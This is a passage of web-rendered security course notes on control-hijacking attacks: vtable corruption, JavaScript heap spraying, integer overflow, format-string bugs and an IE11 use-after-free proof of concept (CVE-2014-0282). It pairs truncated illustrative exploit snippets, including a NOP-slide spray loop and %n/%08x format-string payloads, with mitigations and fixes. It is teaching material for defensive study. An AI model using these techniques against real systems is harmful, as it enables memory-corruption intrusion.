<a class=anchor href=#heap-exploits-corrupting-virtual-tables>#</a></h3><p>C++ stores data elements of an object, first address in object points to virtual table, which contains pointers to the functions that use those objects</p><p><img src=/notes/images/cs155/2022-03-30-vtable-attack.png alt="vtable overflow"></p><h4 id=example-exploiting-browser-heap>Example: exploiting browser heap
<a class=anchor href=#example-exploiting-browser-heap>#</a></h4><ul><li>Setting: malicious web server sends web page with exploit to requesting victim browser</li><li>Attacker&rsquo;s goal is to infect browsers visiting the website<ul><li>How: send javascript to browser that exploits a heap overflow</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#ff79c6>script</span> <span style=color:#50fa7b>type</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;text/javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>    shellcode <span style=color:#ff79c6>=</span> unescape(<span style=color:#f1fa8c>&#34;%u4343%u4343...&#34;</span>); <span style=color:#6272a4>// allocate in heap
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    overflow_string <span style=color:#ff79c6>=</span> unescape(<span style=color:#f1fa8c>&#34;%u2332%u4276...&#34;</span>);
</span></span><span style=display:flex><span>    cause_overflow(overflow_string); <span style=color:#6272a4>// overflow buf[]
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>&lt;/<span style=color:#ff79c6>script</span>&gt;
</span></span></code></pre></div><p>Problem: attacker does not know where browser places <code>shellcode</code> on the heap</p><p>Solution: Heap Spraying</p><ol><li>Use Javascript to spray heap with shellcode and NOP slides</li><li>Then point vtable ptr anywhere in spray area</li></ol><p><img src=/notes/images/cs155/2022-03-30-heap-spray.png alt="Heap spraying"></p><p>How this works in code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>var</span> nop <span style=color:#ff79c6>=</span> unescape(<span style=color:#f1fa8c>&#34;%u9090%u9090&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ff79c6>while</span> (nop.length <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>0x100000</span>)
</span></span><span style=display:flex><span>    nop <span style=color:#ff79c6>+=</span> nop;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>var</span> shellcode <span style=color:#ff79c6>=</span> unescape(<span style=color:#f1fa8c>&#34;%u4343%u4343...&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>var</span> x <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> <span style=color:#8be9fd;font-style:italic>Array</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> (<span style=color:#8be9fd;font-style:italic>var</span> i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>1000</span>; i<span style=color:#ff79c6>++</span>)
</span></span><span style=display:flex><span>    x[i] <span style=color:#ff79c6>=</span> nop <span style=color:#ff79c6>+</span> shellcode;
</span></span></code></pre></div><p>Pointing the function pointer almost anywhere in the heap will cause shellcode to execute.</p><h3 id=ad-hoc-heap-overflow-mitigations>Ad-hoc heap overflow mitigations
<a class=anchor href=#ad-hoc-heap-overflow-mitigations>#</a></h3><ul><li>Better browser architecture<ul><li>Store Javascript strings in a separate heap from browser heap</li></ul></li><li>OpenBSD and Windows 8 heap overflow protection<ul><li>After each virtual memory page, the next page (address above) is an unallocated and unwriteable guard page</li><li>If buffer overflow crosses a page boundary, an access boundary is detected and the program crashes</li></ul></li></ul><h3 id=finding-overflows-by-fuzzing>Finding overflows by fuzzing
<a class=anchor href=#finding-overflows-by-fuzzing>#</a></h3><ul><li>Run web server on local machine</li><li>Use American Fuzzy Lop (AFL) to issue malformed request (ending with <code>$$$$$</code>)<ul><li>Fuzzers: automated tools for this</li></ul></li><li>If web server crashes, search core dump for <code>$$$$$</code> to find overflow location</li><li>Construct exploit (not easy given latest defenses)</li></ul><h2 id=more-control-hijacking-exploits>More control hijacking exploits
<a class=anchor href=#more-control-hijacking-exploits>#</a></h2><h3 id=integer-overflows>Integer overflows
<a class=anchor href=#integer-overflows>#</a></h3><p>Problem: what happens when <code>int</code> exceeds max value?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>int</span> m; <span style=color:#6272a4>// 32 bits
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#8be9fd>short</span> s; <span style=color:#6272a4>// 16 bits
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span><span style=color:#8be9fd>char</span> c; <span style=color:#6272a4>// 8 bits
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>c <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0x80</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x80</span>; <span style=color:#6272a4>// 128 + 128 = 0
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>s <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xff80</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x80</span>; <span style=color:#6272a4>// 0
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>m <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0xffffff80</span> <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>0x80</span>; <span style=color:#6272a4>// 0
</span></span></span></code></pre></div><p>Exploit example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>func</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>buf1, <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>buf2, <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> len1, <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>int</span> len2) {
</span></span><span style=display:flex><span>    <span style=color:#8be9fd>char</span> temp[<span style=color:#bd93f9>256</span>];
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> (len1 <span style=color:#ff79c6>+</span> len2 <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>256</span>) <span style=color:#6272a4>// length check
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>memcpy</span>(temp, buf1, len1);
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>memcpy</span>(temp <span style=color:#ff79c6>+</span> len1, buf2, len2); <span style=color:#6272a4>// concatenate buf
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#50fa7b>do_something</span>(temp);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>If <code>len1 == 0x80</code> and <code>len2 == 0xffffff80</code>, then <code>len1 + len2 == 0</code>, so second <code>memcpy()</code> will overflow the heap!</p><p>To fix: use a length check like</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff79c6>if</span> (len1 <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>256</span> <span style=color:#ff79c6>||</span> len2 <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>256</span> <span style=color:#ff79c6>||</span> len1 <span style=color:#ff79c6>+</span> len2 <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>256</span>)
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>;
</span></span></code></pre></div><h3 id=format-string-bugs>Format string bugs
<a class=anchor href=#format-string-bugs>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8be9fd>int</span> <span style=color:#50fa7b>func</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>user) {
</span></span><span style=display:flex><span>    <span style=color:#50fa7b>fprintf</span>(stderr, user);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Problem: what if <code>*user == "%s%s%s%s%s%s%s"</code>?</p><ul><li>Most likely: program will crash (denial of service)</li><li>If not, program will print memory contents (privacy concerns)</li><li>Full exploit using <code>user == "%n"</code> (print everything previously printed to <code>stdout</code>)</li></ul><p>Correct form: <code>fprintf(stderr, "%s", user);</code></p><p>Exploits:</p><ul><li>Dumping arbitrary memory<ul><li>Walk up stack until desired pointer is found</li><li><code>printf("%08x.%08x.%08x.%08x|%s|");</code></li><li><code>"%08x"</code>: move 8 bytes up the stack</li></ul></li><li>Writing to arbitrary memory<ul><li><code>printf("hello %n", &temp);</code> - writes &lsquo;6&rsquo; into <code>temp</code></li><li><code>printf("%08x.%08x.%08x.%08x.%n");</code></li></ul></li></ul><h3 id=use-after-free-exploits>Use-after-free exploits
<a class=anchor href=#use-after-free-exploits>#</a></h3><p>Constituted 36% of security vulnerabilities in Chrome 2015-2020</p><p>Example: IE11 CVE-2014-0282</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#ff79c6>form</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;form&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>textarea</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;c1&#34;</span> <span style=color:#50fa7b>name</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;a1&#34;</span> &gt;&lt;/<span style=color:#ff79c6>textarea</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>input</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;c2&#34;</span> <span style=color:#50fa7b>type</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;text&#34;</span> <span style=color:#50fa7b>name</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;a2” value=&#34;</span><span style=color:#50fa7b>val</span>&#34;&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>form</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>script</span>&gt;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>function</span> changer() {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;form&#34;</span>).innerHTML <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        CollectGarbage(); <span style=color:#6272a4>// erase c1 and c2 fields
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    }
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;c1&#34;</span>).onpropertychange <span style=color:#ff79c6>=</span> changer;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// loops on c1.DoReset() and c2.DoReset()
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;form&#34;</span>).reset();
</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>script</span>&gt;
</span></span></code></pre></div><ul><li><code>c1.doReset()</code> causes <code>changer()</code> to be called and free object <code>c2</code><ul><li><code>c2</code> points to a vtable that points to <code>doSomething</code>, <code>doReset</code>, and <code>doSomethingElse</code></li></ul></li><li>Suppose attacker allocates a string of same size as <code>vtable</code> containing ShellCode<ul><li>When <code>c2.DoReset()</code> is called, attacker gets shell</li></ul></li></ul><p>The exploit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#ff79c6>form</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;form&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>textarea</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;c1&#34;</span> <span style=color:#50fa7b>name</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;a1&#34;</span> &gt;&lt;/<span style=color:#ff79c6>textarea</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#ff79c6>input</span> <span style=color:#50fa7b>id</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;c2&#34;</span> <span style=color:#50fa7b>type</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;text&#34;</span> <span style=color:#50fa7b>name</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;a2” value=&#34;</span><span style=color:#50fa7b>val</span>&#34;&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>form</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#ff79c6>script</span>&gt;
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>function</span> changer() {
</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;form&#34;</span>).innerHTML <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        CollectGarbage(); <span style=color:#6272a4>// erase c1 and c2 fields
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// allocate string object to occupy vtable location
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    }
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;c1&#34;</span>).onpropertychange <span style=color:#ff79c6>=</span> changer;
</span></span><span style=display:flex><span>    <span style=color:#6272a4>// loops on c1.DoReset() and c2.DoReset()
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>    <span style=color:#8be9fd;font-style:italic>document</span>.getElementById(<span style=color:#f1fa8c>&#34;form&#34;</span>).reset();
</span></span><span style=display:flex><span>&lt;/<span style=color:#ff79c6>script</span>&gt;
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#basic-control-hijacking-attacks>Basic Control Hijacking Attacks</a><ul><li><a href=#buffer-overflow-attacks>Buffer overflow attacks</a><ul><li><a href=#linux-process-memory-layout-x86-64>Linux process memory layout (x86-64)</a></li><li><a href=#linux-stack-frame-x86-64>Linux stack frame (x86-64)</a></li><li><a href=#review-of-buffer-overflows>Review of buffer overflows</a></li><li><a href=#basic-stack-exploit>Basic stack exploit</a><ul><li><a href=#the-nop-slide>The NOP slide</a></li><li><a href=#details-and-examples>Details and examples</a></li></ul></li><li><a href=#many-unsafe-libc-functions>Many unsafe libc functions</a></li><li><a href=#buffer-overflow-exploit-opportunities>Buffer overflow exploit opportunities</a></li><li><a href=#heap-exploits-corrupting-virtual-tables>Heap exploits: corrupting virtual tables</a><ul><li><a href=#example-exploiting-browser-heap>Example: exploiting browser heap</a></li></ul></li><li><a href=#ad-hoc-heap-overflow-mitigations>Ad-hoc heap overflow mitigations</a></li><li><a href=#finding-overflows-by-fuzzing>Finding overflows by fuzzing</a></li></ul></li><li><a href=#more-control-hijacking-exploits>More control hijacking exploits</a><ul><li><a href=#integer-overflows>Integer overflows</a></li><li><a href=#format-string-bugs>Format string bugs</a></li><li><a href=#use-after-free-exploits>Use-after-free exploits</a></li></ul></li></ul></li></ul></nav></div></aside></main></body></html>